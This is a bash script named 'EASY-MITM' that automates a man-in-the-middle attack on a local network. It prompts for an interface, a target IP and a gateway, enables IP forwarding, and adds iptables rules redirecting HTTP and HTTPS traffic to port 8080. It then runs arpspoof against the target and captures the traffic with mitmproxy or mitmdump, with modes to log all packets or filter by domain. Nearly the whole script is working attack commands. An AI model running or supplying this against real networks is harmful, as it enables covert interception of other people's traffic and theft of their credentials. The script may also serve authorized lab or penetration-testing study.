#!/bin/bash

echo "#######################################################################
#######    #     #####  #     #         #     #   ###   ####### #     #
#         # #   #     #  #   #          ##   ##    #       #    ##   ##
#        #   #  #         # #           # # # #    #       #    # # # #
#####   #     #  #####     #     #####  #  #  #    #       #    #  #  #
#       #######       #    #            #     #    #       #    #     #
#       #     # #     #    #            #     #    #       #    #     #
####### #     #  #####     #            #     #   ###      #    #     #
#######################################################################"
echo "Require Installed: arpspoof, mitmproxy, ifconfig
"

echo "1) Your ethernet hardware (e.g. wlan0)
2) Target IP Address
3) Default Gateway IP Address
Please answer to the above three questions [Enter]"
read ENTER

while true
do
  ifconfig
  echo "1) Your ethernet hardware (e.g. eth0, wlan0) :"
  read eH

  echo "2) Target IP Address (e.g. 192.168.xx.xx) :"
  read tIP

  echo "3) Default Gateway IP Address (e.g. 192.168.xx.1):"
  read gIP

  echo "---------------------- Your answer ----------------------"
  echo "Ethernet hardware: $eH
Target IP Address: $tIP
Default Gateway IP Address: $gIP"
  echo "---------------------------------------------------------"

  echo "Is this OK? [y/n]"
  read ANS

  if [ "${ANS}" = 'y' -o "${ANS}" = 'yes' ]; then
      break
  elif [ "${ANS}" = 'n' -o "${ANS}" = 'no' ]; then
      continue
  else
      echo "[Error] No match string"
      exit 1
  fi
done


echo "1) Default MITM Attack mode: Transparent Proxying
2) Check Communication mode: SSL/TLS handshake eeror check and saving all packet
3) Specific analysis mode: Analysis Specific Domain
4) Transparent mode: Does not run the mitmproxy
Choose MITM Version [1, 2, 3, 4]:"
read mVer
echo "Started..."

sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A PREROUTING -i $eH -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i $eH -p tcp --dport 443 -j REDIRECT --to-port 8080
sudo arpspoof -i $eH -t $tIP -r $gIP  > /dev/null 2>&1 &


if [ "${mVer}" = '1' ]; then
    mitmproxy -T --host -e
fi

if [ "${mVer}" = '2' ]; then
    filename="dump_"`date '+%F-%T'`".log"
    echo "Save file name: $filename"
    mitmdump -T --host > $filename &
    tail -f -n 100 $filename | grep "failed" -B 5 -n
fi

if [ "${mVer}" = '3' ]; then
    echo "Domain name:"
    read domain
    filename="dump_"`date '+%F-%T'`".log"
    echo "Save file name: $filename"
    mitmdump -T --host > $filename &
    tail -f -n 100 $filename | grep $domain -6 -n
    echo '3'
fi

if [ "${mVer}" = '4' ]; then
    exit 1
fi